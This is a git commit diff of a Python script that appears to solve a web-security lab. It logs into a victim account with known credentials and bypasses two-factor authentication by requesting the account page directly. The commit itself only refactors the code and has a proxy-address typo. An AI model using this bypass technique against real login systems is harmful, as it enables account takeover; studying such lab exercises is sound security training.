0a799ceeea928ce0ed1061edc51f2bf00d0cb222
Hieu Tran <hieu.tran@enouvo.com>
2023-10-11 16:13:59 +0700

    fix authen

--- authentication-lab.py
+++ authentication-lab.py
@@ -4,29 +4,28 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}
+
 
 def access_carlos_account(s, url):
+
     # Log into Carlos's account
     print("(+) Logging into Carlos's account and bypassing 2FA verification...")
     login_url = url + "/login"
     login_data = {"username": "carlos", "password": "montoya"}
-    r = requests.post(login_url, data=login_data,
-                      allow_redirects=False, verify=False, proxies=proxies)
-    print("r", r)
+    r = s.post(login_url, data=login_data, allow_redirects=False,
+               verify=False, proxies=proxies)
     if r.status_code == 200:
         print('Login successful!')
     else:
         print('Login failed.')
-
     # Confirm bypass
-    myAccount_url = url + "/my-account"
-    print("myAccount_url", myAccount_url)
-
-    r = s.get(myAccount_url, verify=False, proxies=proxies)
+    myaccount_url = url + "/my-account"
+    r = s.get(myaccount_url, verify=False, proxies=proxies)
     if "Log out" in r.text:
-        print("(+) Successfully bypassed 2FA verification")
+        print("(+) Successfully bypassed 2FA verification.")
     else:
-        print("(+) Exploit failed")
+        print("(-) Exploit failed.")
         sys.exit(-1)
 
 
@@ -41,6 +40,5 @@ def main():
     access_carlos_account(s, url)
 
 
-proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
